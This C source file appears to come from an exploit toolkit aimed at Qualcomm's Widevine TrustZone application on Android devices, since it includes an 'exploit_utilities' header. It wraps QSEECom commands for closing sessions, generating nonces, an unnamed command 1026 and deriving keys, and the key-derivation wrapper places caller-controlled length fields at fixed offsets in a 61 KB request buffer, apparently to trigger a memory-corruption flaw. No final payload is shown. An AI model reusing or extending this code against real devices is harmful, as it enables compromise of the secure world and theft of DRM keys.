#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include "widevine_commands.h"
#include "symbols.h"
#include "defs.h"
#include "exploit_utilities.h"

int close_session(struct qcom_wv_handle* handle, int ctx_id) {

	//Initializing the request and response buffers
	uint32_t cmd_req_size = QSEECOM_ALIGN(8);
	uint32_t cmd_resp_size = QSEECOM_ALIGN(8);
	uint32_t* cmd_req = malloc(cmd_req_size);
	uint32_t* cmd_resp = malloc(cmd_resp_size);
	memset(cmd_req, 0, cmd_req_size);
	memset(cmd_resp, 0, cmd_resp_size);

	//Filling in the data in the request buffer
	cmd_req[0] = OEMCrypto_CloseSession;
	cmd_req[1] = ctx_id;  //ctxId

	int res = (*handle->QSEECom_set_bandwidth)(handle->qseecom, true);
	if (res < 0) {
		free(cmd_req);
		free(cmd_resp);
		perror("[-] Unable to enable clks");
		return -errno;
	}
	
	res = (*handle->QSEECom_send_cmd)(handle->qseecom,
									  cmd_req,
									  cmd_req_size,
									  cmd_resp,
									  cmd_resp_size);

	if ((*handle->QSEECom_set_bandwidth)(handle->qseecom, false)) {
		perror("[-] Import key command: (unable to disable clks)");
	}
	
	free(cmd_req);
	free(cmd_resp);
	return res;

}

int derive_keys_from_session_key(struct qcom_wv_handle* handle, int ctx_id,
								 uint32_t enc_session_key_length,
								 uint32_t mac_key_context_length,
								 uint32_t enc_key_context_length) {

	//Initializing the request and response buffers
	uint32_t cmd_req_size = QSEECOM_ALIGN(61460);
	uint32_t cmd_resp_size = QSEECOM_ALIGN(8);
	uint32_t* cmd_req = malloc(cmd_req_size);
	uint32_t* cmd_resp = malloc(cmd_resp_size);
	memset(cmd_req, 0, cmd_req_size);
	memset(cmd_resp, 0, cmd_resp_size);

	cmd_req[0] = OEMCrypto_DeriveKeysFromSessionKey;
	cmd_req[1] = ctx_id;				   					   //ctxId
	cmd_req[0x5008/sizeof(uint32_t)] = enc_session_key_length; //enc_session_key_length
	cmd_req[0xA00C/sizeof(uint32_t)] = mac_key_context_length; //mac_key_context_length
	cmd_req[0xF010/sizeof(uint32_t)] = enc_key_context_length; //enc_key_context_length

	int res = (*handle->QSEECom_set_bandwidth)(handle->qseecom, true);
	if (res < 0) {
		free(cmd_req);
		free(cmd_resp);
		perror("[-] Unable to enable clks");
		return -errno;
	}
	
	res = (*handle->QSEECom_send_cmd)(handle->qseecom,
									  cmd_req,
									  cmd_req_size,
									  cmd_resp,
									  cmd_resp_size);

	if ((*handle->QSEECom_set_bandwidth)(handle->qseecom, false)) {
		perror("[-] Import key command: (unable to disable clks)");
	}
	
	res = (int)cmd_resp[1];

	free(cmd_req);
	free(cmd_resp);
	
	return res;

}

int send_cmd_1026(struct qcom_wv_handle* handle) {
	
	//Initializing the request and response buffers
	uint32_t cmd_req_size = QSEECOM_ALIGN(4);
	uint32_t cmd_resp_size = QSEECOM_ALIGN(0xC);
	uint32_t* cmd_req = malloc(cmd_req_size);
	uint32_t* cmd_resp = malloc(cmd_resp_size);
	memset(cmd_req, 0, cmd_req_size);
	memset(cmd_resp, 0, cmd_resp_size);

	cmd_req[0] = 1026;

	int res = (*handle->QSEECom_set_bandwidth)(handle->qseecom, true);
	if (res < 0) {
		free(cmd_req);
		free(cmd_resp);
		perror("[-] Unable to enable clks");
		return -errno;
	}

	res = (*handle->QSEECom_send_cmd)(handle->qseecom,
									  cmd_req,
									  cmd_req_size,
									  cmd_resp,
									  cmd_resp_size);

	if ((*handle->QSEECom_set_bandwidth)(handle->qseecom, false)) {
		perror("[-] Import key command: (unable to disable clks)");
	}

	res = (int)cmd_resp[1];

	free(cmd_req);
	free(cmd_resp);

	return res;

}

int generate_nonce(struct qcom_wv_handle* handle, int ctx_id, uint32_t* nonce) {
	
	//Initializing the request and response buffers
	uint32_t cmd_req_size = QSEECOM_ALIGN(0x8);
	uint32_t cmd_resp_size = QSEECOM_ALIGN(0xC);
	uint32_t* cmd_req = malloc(cmd_req_size);
	uint32_t* cmd_resp = malloc(cmd_resp_size);
	memset(cmd_req, 0, cmd_req_size);
	memset(cmd_resp, 0, cmd_resp_size);

	cmd_req[0] = OEMCrypto_GenerateNonce;
	cmd_req[1] = ctx_id;

	int res = (*handle->QSEECom_set_bandwidth)(handle->qseecom, true);
	if (res < 0) {
		free(cmd_req);
		free(cmd_resp);
		perror("[-] Unable to enable clks");
		return -errno;
	}

	res = (*handle->QSEECom_send_cmd)(handle->qseecom,
									  cmd_req,
									  cmd_req_size,
									  cmd_resp,
									  cmd_resp_size);

	if ((*handle->QSEECom_set_bandwidth)(handle->qseecom, false)) {
		perror("[-] Import key command: (unable to disable clks)");
	}

	res = (int)cmd_resp[2];
	*nonce = cmd_resp[1];

	free(cmd_req);
	free(cmd_resp);

	return res;

}
